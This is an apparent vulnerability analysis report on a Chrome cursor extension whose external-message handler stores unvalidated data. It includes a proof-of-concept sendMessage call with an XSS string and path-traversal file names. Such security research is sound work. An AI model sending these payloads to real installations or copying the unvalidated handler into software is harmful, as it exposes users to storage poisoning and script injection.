# CoCo Analysis: oinkhgpjmeccknjbbccabjfonamfmcbn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (duplicate flows to chrome_storage_local_set_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oinkhgpjmeccknjbbccabjfonamfmcbn/opgen_generated_files/bg.js
Line 1241: `if (!cursors.cursors.hasOwnProperty(request.cursor.alt_name))`
Line 1243: `cursors.cursors[request.cursor.alt_name].id = request.cursor.cat;`
Line 1244: `cursors.cursors[request.cursor.alt_name].name = request.cursor.base_name;`

**Code:**

```javascript
// Background script - External message handler (bg.js Line 1237-1268)
chrome.runtime.onMessageExternal.addListener(
    function (request, sender, sendResponse) {
        domain = 'https://cursor-land.com';
        chrome.storage.local.get('cursors').then(function (cursors) {
            if (!cursors.cursors.hasOwnProperty(request.cursor.alt_name))  // ← attacker-controlled
                cursors.cursors[request.cursor.alt_name] = {'items': []};
            cursors.cursors[request.cursor.alt_name].id = request.cursor.cat;  // ← attacker-controlled
            cursors.cursors[request.cursor.alt_name].name = request.cursor.base_name;  // ← attacker-controlled
            items = cursors.cursors[request.cursor.alt_name].items;
            isAdded = false;
            items.forEach(function (item, index) {
                if (request.cursor.id == item.id) {  // ← attacker-controlled
                    isAdded = true;
                    cursors.cursors[request.cursor.alt_name].items[index].hidden = 0;
                    chrome.storage.local.set({  // Storage poisoning sink
                        cursors: cursors.cursors
                    });
                }
            });

            if (!isAdded) {
                toAdd = {
                    "cursor": {
                        "offsetX": request.cursor.offsetX,  // ← attacker-controlled
                        "offsetY": request.cursor.offsetY,  // ← attacker-controlled
                        "path": domain + '/resources/cursors/' + request.cursor.c_file  // ← attacker-controlled file path
                    },
                    "hidden": 0,
                    "id": request.cursor.id,  // ← attacker-controlled
                    "name": request.cursor.name,  // ← attacker-controlled
                    "pointer": {
                        "offsetX": request.cursor.offsetX_p,  // ← attacker-controlled
                        "offsetY": request.cursor.offsetY_p,  // ← attacker-controlled
                        "path": domain + '/resources/pointers/' + request.cursor.p_file  // ← attacker-controlled file path
                    }
                };
                cursors.cursors[request.cursor.alt_name].items.push(toAdd);
                chrome.storage.local.set({  // Storage poisoning sink
                    cursors: cursors.cursors
                });
            }
        });

        sendResponse({});
        return true;
    }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From https://cursor-land.com or https://cursor.style (whitelisted domains)
chrome.runtime.sendMessage(
    'oinkhgpjmeccknjbbccabjfonamfmcbn',
    {
        cursor: {
            alt_name: 'malicious',
            cat: 'evil_category',
            base_name: '<script>alert(1)</script>',
            id: 'attacker_id',
            name: 'malicious_cursor',
            offsetX: 0,
            offsetY: 0,
            offsetX_p: 0,
            offsetY_p: 0,
            c_file: '../../../evil.js',  // Path traversal attempt
            p_file: '../../../evil.png'
        }
    },
    function(response) {
        console.log('Storage poisoned');
    }
);
```

**Impact:** Attacker can poison storage with arbitrary cursor configuration data including malicious file paths and XSS payloads. While the extension uses a hardcoded domain prefix for paths, the attacker controls file names allowing potential path traversal. The poisoned data persists in storage and could be retrieved by the extension's content scripts or popup to modify cursor behavior on user pages. The extension has "storage", "tabs", "activeTab", and "scripting" permissions with "<all_urls>" host permissions, allowing the poisoned cursor data to affect all websites the user visits.
